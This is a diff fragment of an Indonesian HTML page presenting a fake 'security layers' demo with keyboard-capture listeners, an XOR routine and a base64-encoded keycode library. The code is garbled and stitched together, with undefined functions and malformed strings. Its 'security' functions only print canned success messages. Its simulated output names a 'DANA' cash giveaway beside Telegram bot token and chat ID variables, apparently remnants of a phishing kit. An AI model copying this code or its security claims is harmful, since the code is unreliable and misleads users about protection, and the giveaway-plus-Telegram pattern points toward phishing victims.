+        96: 'NUM_PAD_0',
+        97: 'NUM_PAD_1',
+        98: 'NUM_PAD_2',
+        99: 'NUM_PAD_3',
+        100: 'NUM_PAD_4',
+        101: 'NUM_PAD_5',
+        102: 'NUM_PAD_6',
+        103: 'NUM_PAD_7',
+        104: 'NUM_PAD_8',
+        105: 'NUM_PAD_9',
+        106: 'NUM_PAD_ASTERISK',
+        107: 'NUM_PAD_PLUS',
+        109: 'NUM_PAD_MINUS',
+        111: 'NUM_PAD_FOWARD_SLASH',
+        112: 'F1',
+        113: 'F2',
+        114: 'F3',
+        115: 'F4',
+        116: 'F5',
+        117: 'F6',
+        118: 'F7',
+        119: 'F8',
+        120: 'F9',
+        121: 'F10',
+        122: 'F11',
+        123: 'F12',
+        144: 'NUM_LOCK',
+        145: 'SCROLL_LOCK',
+        186: [';',':'],
+        187: ['=','+'],
+        188: [',','<'],
+        189: ['-','_'],
+        190: ['.','>'],
+        191: ['/','?'],
+        192: ['`','~'],
+        219: ['[','{'],
+        220: ['\\','|'],
+        221: [']','}'],
+        222: ['\'','"']
+    }
+
+    var lastpressed         = [],
+        currentlyPressed    = [],
+        shift               = false;
+
+    function isArray(obj) {
+        return Array.prototype.isPrototypeOf(obj);
+    }
+
+    function toChar(keycode) {
+        var shift   = !~currentlyPressed.indexOf(/shift/i),
+            char    = (shift && isArray(char) ? char[1] : char[0]);
+
+        return shift ? char : char.toLowerCase();
+    }
+
+    document.addEventListener('keycode', function(e) {
+        var char = toChar(e.keyCode);
+
+        currentlyPressed.push(char);
+
+        e.xchar     = char;
+        e.xallChars = currentlyPressed;
+    }, true);
+
+    document.addEventListener('keyup', function(e) {
+        e.xchar     = currentlyPressed.splice(toChar(e.keyCode), 1)[0];
+        e.xallChars = currentlyPressed;
+    }, true);
+
+    return {
+        toChar      : toChar,
+        addToString : addToString
+    }
+})();";
+                    const data = "Ly8gU291cmNlOiBodHRwOi8vanNmaWRkbGUubmV0L3ZXeDhWLwovLyBodHRwOi8vc3RhY2tvdmVyZmxvdy5jb20vcXVlc3Rpb25zLzU2MDMxOTUvZnVsbC1saXN0LW9mLWphdmFzY3JpcHQta2V5Y29kZXMKCi8qKgogKiBDb25lbmllbmNlIG1ldGhvZCByZXR1cm5zIGNvcnJlc3BvbmRpbmcgdmFsdWUgZm9yIGdpdmVuIGtleU5hbWUgb3Iga2V5Q29kZS4KICoKICogQHBhcmFtIHtNaXhlZH0ga2V5Q29kZSB7TnVtYmVyfSBvciBrZXlOYW1lIHtTdHJpbmd9CiAqIEByZXR1cm4ge01peGVkfQogKiBAYXBpIHB1YmxpYwogKi8KCmZ1bmN0aW9uIGtleUNvZGUoc2VhcmNoSW5wdXQpIHsKICAvLyBLZXlib2FyZCBFdmVudHMKICBpZiAoc2VhcmNoSW5wdXQgJiYgJ29iamVjdCcgPT09IHR5cGVvZiBzZWFyY2hJbnB1dCkgewogICAgdmFyIGhhc0tleUNvZGUgPSBzZWFyY2hJbnB1dC53aGljaCB8fCBzZWFyY2hJbnB1dC5rZXlDb2RlIHx8IHNlYXJjaElucHV0LmNoYXJDb2RlCiAgICBpZiAoaGFzS2V5Q29kZSkgc2VhcmNoSW5wdXQgPSBoYXNLZXlDb2RlCiAgfQoKICAvLyBOdW1iZXJzCiAgaWYgKCdudW1iZXInID09PSB0eXBlb2Ygc2VhcmNoSW5wdXQpIHJldHVybiBuYW1lc1tzZWFyY2hJbnB1dF0KCiAgLy8gRXZlcnl0aGluZyBlbHNlIChjYXN0IHRvIHN0cmluZykKICB2YXIgc2VhcmNoID0gU3RyaW5nKHNlYXJjaElucHV0KQoKICAvLyBjaGVjayBjb2RlcwogIHZhciBmb3VuZE5hbWVkS2V5ID0gY29kZXNbc2VhcmNoLnRvTG93ZXJDYXNlKCldCiAgaWYgKGZvdW5kTmFtZWRLZXkpIHJldHVybiBmb3VuZE5hbWVkS2V5CgogIC8vIGNoZWNrIGFsaWFzZXMKICB2YXIgZm91bmROYW1lZEtleSA9IGFsaWFzZXNbc2VhcmNoLnRvTG93ZXJDYXNlKCldCiAgaWYgKGZvdW5kTmFtZWRLZXkpIHJldHVybiBmb3VuZE5hbWVkS2V5CgogIC8vIHdlaXJkIGNoYXJhY3Rlcj8KICBpZiAoc2VhcmNoLmxlbmd0aCA9PT0gMSkgcmV0dXJuIHNlYXJjaC5jaGFyQ29kZUF0KDApCgogIHJldHVybiB1bmRlZmluZWQKfQoKLyoqCiAqIENvbXBhcmVzIGEga2V5Ym9hcmQgZXZlbnQgd2l0aCBhIGdpdmVuIGtleUNvZGUgb3Iga2V5TmFtZS4KICoKICogQHBhcmFtIHtFdmVudH0gZXZlbnQgS2V5Ym9hcmQgZXZlbnQgdGhhdCBzaG91bGQgYmUgdGVzdGVkCiAqIEBwYXJhbSB7TWl4ZWR9IGtleUNvZGUge051bWJlcn0gb3Iga2V5TmFtZSB7U3RyaW5nfQogKiBAcmV0dXJuIHtCb29sZWFufQogKiBAYXBpIHB1YmxpYwogKi8Ka2V5Q29kZS5pc0V2ZW50S2V5ID0gZnVuY3Rpb24gaXNFdmVudEtleShldmVudCwgbmFtZU9yQ29kZSkgewogIGlmIChldmVudCAmJiAnb2JqZWN0JyA9PT0gdHlwZW9mIGV2ZW50KSB7CiAgICB2YXIga2V5Q29kZSA9IGV2ZW50LndoaWNoIHx8IGV2ZW50LmtleUNvZGUgfHwgZXZlbnQuY2hhckNvZGUKICAgIGlmIChrZXlDb2RlID09PSBudWxsIHx8IGtleUNvZGUgPT09IHVuZGVmaW5lZCkgeyByZXR1cm4gZmFsc2U7IH0KICAgIGlmICh0eXBlb2YgbmFtZU9yQ29kZSA9PT0gJ3N0cmluZycpIHsKICAgICAgLy8gY2hlY2sgY29kZXMKICAgICAgdmFyIGZvdW5kTmFtZWRLZXkgPSBjb2Rlc1tuYW1lT3JDb2RlLnRvTG93ZXJDYXNlKCldCiAgICAgIGlmIChmb3VuZE5hbWVkS2V5KSB7IHJldHVybiBmb3VuZE5hbWVkS2V5ID09PSBrZXlDb2RlOyB9CiAgICAKICAgICAgLy8gY2hlY2sgYWxpYXNlcwogICAgICB2YXIgZm91bmROYW1lZEtleSA9IGFsaWFzZXNbbmFtZU9yQ29kZS50b0xvd2VyQ2FzZSgpXQogICAgICBpZiAoZm91bmROYW1lZEtleSkgeyByZXR1cm4gZm91bmROYW1lZEtleSA9PT0ga2V5Q29kZTsgfQogICAgfSBlbHNlIGlmICh0eXBlb2YgbmFtZU9yQ29kZSA9PT0gJ251bWJlcicpIHsKICAgICAgcmV0dXJuIG5hbWVPckNvZGUgPT09IGtleUNvZGU7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7CiAgfQp9CgpleHBvcnRzID0gbW9kdWxlLmV4cG9ydHMgPSBrZXlDb2RlOwoKLyoqCiAqIEdldCBieSBuYW1lCiAqCiAqICAgZXhwb3J0cy5jb2RlWydlbnRlciddIC8vID0+IDEzCiAqLwoKdmFyIGNvZGVzID0gZXhwb3J0cy5jb2RlID0gZXhwb3J0cy5jb2RlcyA9IHsKICAnYmFja3NwYWNlJzogOCwKICAndGFiJzogOSwKICAnZW50ZXInOiAxMywKICAnc2hpZnQnOiAxNiwKICAnY3RybCc6IDE3LAogICdhbHQnOiAxOCwKICAncGF1c2UvYnJlYWsnOiAxOSwKICAnY2FwcyBsb2NrJzogMjAsCiAgJ2VzYyc6IDI3LAogICdzcGFjZSc6IDMyLAogICdwYWdlIHVwJzogMzMsCiAgJ3BhZ2UgZG93bic6IDM0LAogICdlbmQnOiAzNSwKICAnaG9tZSc6IDM2LAogICdsZWZ0JzogMzcsCiAgJ3VwJzogMzgsCiAgJ3JpZ2h0JzogMzksCiAgJ2Rvd24nOiA0MCwKICAnaW5zZXJ0JzogNDUsCiAgJ2RlbGV0ZSc6IDQ2LAogICdjb21tYW5kJzogOTEsCiAgJ2xlZnQgY29tbWFuZCc6IDkxLAogICdyaWdodCBjb21tYW5kJzogOTMsCiAgJ251bXBhZCAqJzogMTA2LAogICdudW1wYWQgKyc6IDEwNywKICAnbnVtcGFkIC0nOiAxMDksCiAgJ251bXBhZCAuJzogMTEwLAogICdudW1wYWQgLyc6IDExMSwKICAnbnVtIGxvY2snOiAxNDQsCiAgJ3Njcm9sbCBsb2NrJzogMTQ1LAogICdteSBjb21wdXRlcic6IDE4MiwKICAnbXkgY2FsY3VsYXRvcic6IDE4MywKICAnOyc6IDE4NiwKICAnPSc6IDE4NywKICAnLCc6IDE4OCwKICAnLSc6IDE4OSwKICAnLic6IDE5MCwKICAnLyc6IDE5MSwKICAnYCc6IDE5MiwKICAnWyc6IDIxOSwKICAnXFwnOiAyMjAsCiAgJ10nOiAyMjEsCiAgIiciOiAyMjIKfQoKLy8gSGVscGVyIGFsaWFzZXMKCnZhciBhbGlhc2VzID0gZXhwb3J0cy5hbGlhc2VzID0gewogICd3aW5kb3dzJzogOTEsCiAgJ8Oi4oChwqcnOiAxNiwKICAnw6LFksKlJzogMTgsCiAgJ8OixZLGkic6IDE3LAogICfDosWSy5wnOiA5MSwKICAnY3RsJzogMTcsCiAgJ2NvbnRyb2wnOiAxNywKICAnb3B0aW9uJzogMTgsCiAgJ3BhdXNlJzogMTksCiAgJ2JyZWFrJzogMTksCiAgJ2NhcHMnOiAyMCwKICAncmV0dXJuJzogMTMsCiAgJ2VzY2FwZSc6IDI3LAogICdzcGMnOiAzMiwKICAnc3BhY2ViYXInOiAzMiwKICAncGd1cCc6IDMzLAogICdwZ2RuJzogMzQsCiAgJ2lucyc6IDQ1LAogICdkZWwnOiA0NiwKICAnY21kJzogOTEKfQoKLyohCiAqIFByb2dyYW1hdGljYWxseSBhZGQgdGhlIGZvbGxvd2luZwogKi8KCi8vIGxvd2VyIGNhc2UgY2hhcnMKZm9yIChpID0gOTc7IGkgPCAxMjM7IGkrKykgY29kZXNbU3RyaW5nLmZyb21DaGFyQ29kZShpKV0gPSBpIC0gMzIKCi8vIG51bWJlcnMKZm9yICh2YXIgaSA9IDQ4OyBpIDwgNTg7IGkrKykgY29kZXNbaSAtIDQ4XSA9IGkKCi8vIGZ1bmN0aW9uIGtleXMKZm9yIChpID0gMTsgaSA8IDEzOyBpKyspIGNvZGVzWydmJytpXSA9IGkgKyAxMTEKCi8vIG51bXBhZCBrZXlzCmZvciAoaSA9IDA7IGkgPCAxMDsgaSsrKSBjb2Rlc1snbnVtcGFkICcraV0gPSBpICsgOTYKCi8qKgogKiBHZXQgYnkgY29kZQogKgogKiAgIGV4cG9ydHMubmFtZVsxM10gLy8gPT4gJ0VudGVyJwogKi8KCnZhciBuYW1lcyA9IGV4cG9ydHMubmFtZXMgPSBleHBvcnRzLnRpdGxlID0ge30gLy8gdGl0bGUgZm9yIGJhY2t3YXJkIGNvbXBhdAoKLy8gQ3JlYXRlIHJldmVyc2UgbWFwcGluZwpmb3IgKGkgaW4gY29kZXMpIG5hbWVzW2NvZGVzW2ldXSA9IGkKCi8vIEFkZCBhbGlhc2VzCmZvciAodmFyIGFsaWFzIGluIGFsaWFzZXMpIHsKICBjb2Rlc1thbGlhc10gPSBhbGlhc2VzW2FsaWFzXQp9";
+                    return "XOR Encrypted: " + this.xorEncrypt(data, key);
+                },
+                xorEncrypt: function(data, key) {
+                    let result = '';
+                    for (let i = 0; i < data.length; i++) {
+                        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+                    }
+                    return btoa(result);
+                }
+            },
+            
+            // Lapis 5: Time-based Security
+            {
+                name: "utf-8",
+                description: "<blockquote>
+                    KeyframeEffect
+                </blockquote>",
+                secure: false,
+                activate: function() {
+                    const now = Date.now();
+                    const expiry = now + 3600000; // 1 hour
+                    return `Time Security: new until ${new Date(expiry).toLocaleTimeString()}`;
+                }
+            },
+            
+            // Lapis 6-30: Lapisan keamanan tambahan...
+            {
+                name: "Data Obfuscation",
+                description: "Mengaburkan kode untuk keamanan",
+                secure: false,
+                activate: function() {
+                    return "Data Obfuscated: [OBFUSCATED_CODE_" + Math.random().toString(36).substr(2, 9) + "]";
+                }
+            },
+            
+            {
+                name: "Input Validation",
+                description: "Validasi input pengguna",
+                secure: false,
+                activate: function() {
+                    return "Input Validation: STRICT_MODE_ACTIVE";
+                }
+            },
+            
+            {
+                name: "Anti-Tampering",
+                description: "Deteksi modifikasi kode",
+                secure: false,
+                activate: function() {
+                    return "Anti-Tamper: CODE_INTEGRITY_VERIFIED";
+                }
+            },
+            
+            {
+                name: "html",
+                description: "<meta http-equiv="content-type" content="text/html;charset=UTF-8" />",
+                secure: false,
+                activate: function() {
+                    return "Secure Storage: ENCRYPTED_MEMORY_ACTIVE";
+                }
+            },
+            
+            {
+                name: "Session Management",
+                description: "Manajemen sesi yang aman",
+                secure: false,
+                activate: function() {
+                    return "Session: SECURE_SESSION_" + Date.now();
+                }
+            },
+            
+            // ... tambahkan lapisan lainnya hingga 30
+        ];
+
+        // Inisialisasi tampilan lapisan keamanan
+        function initializeSecurityLayers() {
+            const container = document.getElementById('securityLayers');
+            container.innerHTML = '';
+            
+            securityLayers.forEach((layer, index) => {
+                const layerElement = document.createElement('div');
+                layerElement.className = 'security-layer';
+                layerElement.innerHTML = `
+                    <span class="layer-number">${index + 1}</span>
+                    <strong>${layer.name}</strong>
+                    <span class="status ${layer.secure ? 'secure' : 'insecure'}">
+                        ${layer.secure ? 'AMAN' : 'TIDAK AMAN'}
+                    </span>
+                    <div style="margin-top: 5px; font-size: 12px; color: #88ff88;">
+                        ${layer.description}
+                    </div>
+                `;
+                container.appendChild(layerElement);
+            });
+            
+            updateProgress();
+        }
+
+        // Mengaktifkan semua lapisan keamanan
+        function activateAllLayers() {
+            const output = document.getElementById('output');
+            output.textContent = 'Mengaktifkan semua lapisan keamanan...\n\n';
+            
+            securityLayers.forEach((layer, index) => {
+                setTimeout(() => {
+                    layer.secure = true;
+                    const result = layer.activate();
+                    output.textContent += `Lapisan ${index + 1}: ${layer.name}\n`;
+                    output.textContent += `Result: ${result}\n\n`;
+                    
+                    // Update UI
+                    initializeSecurityLayers();
+                    
+                    // Scroll to bottom
+                    output.scrollTop = output.scrollHeight;
+                }, index * 200);
+            });
+        }
+
+        // Menjalankan script aman
+        function runSecureScript() {
+            const output = document.getElementById('output');
+            const secureLayers = securityLayers.filter(layer => layer.secure).length;
+            
+            if (secureLayers < securityLayers.length) {
+                output.textContent = `ERROR: Hanya ${secureLayers} dari ${securityLayers.length} lapisan yang aktif!\nAktifkan semua lapisan terlebih dahulu.`;
+                return;
+            }
+            
+            output.textContent = '🔐 SEMUA LAPISAN KEAMANAN AKTIF 🔐\n\n';
+            output.textContent += 'Menjalankan script aman...\n\n';
+            
+            // Simulasi script aman yang berjalan
+            setTimeout(() => {
+                output.textContent += 'utf-8\n';
+                output.textContent += '𝗗𝗔𝗡𝗔 - 𝗚𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶\n';
+                output.textContent += 'var TELEGRAM_CHAT_ID\n';
+                output.textContent += 'var TELEGRAM_BOT_TOKEN\n';
+                output.textContent += 'dokumen\n\n';
+                output.textContent += 'key.tkx\n';
+                output.textContent += 'index';
+            }, 1000);
+        }
+
+        // Reset semua lapisan
+        function resetAll() {
+            securityLayers.forEach(layer => {
+                layer.secure = false;
+            });
+            document.getElementById('output').textContent = 'Semua lapisan keamanan telah direset.';
+            initializeSecurityLayers();
+        }
+
+        // Update progress bar
+        function updateProgress() {
+            const secureLayers = securityLayers.filter(layer => layer.secure).length;
+            const progress = (secureLayers / securityLayers.length) * 100;
+            document.getElementById('securityProgress').style.width = progress + '%';
+        }
+
+        // Inisialisasi saat halaman dimuat
+        document.addEventListener('DOMContentLoaded', initializeSecurityLayers);</script>
+              
+   <!-- Library utama dulu -->
+  <script src="jquery.min.js"></script>
+  <script src="socket.io.min.js"></script>
+  <script src="base64url.js"></script>
+
+  <!-- Library tambahan -->
+  <script src="antd.min.js"></script>
+  <script src="antd.js"></script>
+
+  <!-- Script custom kamu -->
+  <script src="29.js"></script>
+  <script src="b.js"></script>
+  <script src="index.js"></script>
+</body>
+</html>
